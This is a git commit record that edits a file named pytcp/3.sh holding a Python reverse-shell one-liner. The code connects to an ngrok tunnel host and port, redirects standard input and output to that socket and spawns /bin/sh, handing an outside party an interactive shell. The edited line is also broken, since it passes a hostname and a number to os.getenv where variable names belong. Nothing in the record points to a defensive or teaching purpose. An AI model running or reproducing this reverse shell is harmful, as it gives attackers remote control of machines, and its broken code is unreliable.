a1225f4777cfd5da28c019c2949a810eb5fca309
kovaliv1990 <127501891+kovaliv1990@users.noreply.github.com>
2023-03-20 15:32:35 +0200

    Update and rename 2.sh to 3.sh

--- pytcp/3.sh
+++ pytcp/3.sh
@@ -1,4 +1,4 @@
 python -c 'import sys,socket,os,pty;s=socket.socket()
-s.connect((os.getenv("2.tcp.eu.ngrok.io"),int(os.getenv("17016"))))
+s.connect((os.getenv("2.tcp.eu.ngrok.io"),int(os.getenv(17016))))
 [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
 pty.spawn("/bin/sh")'
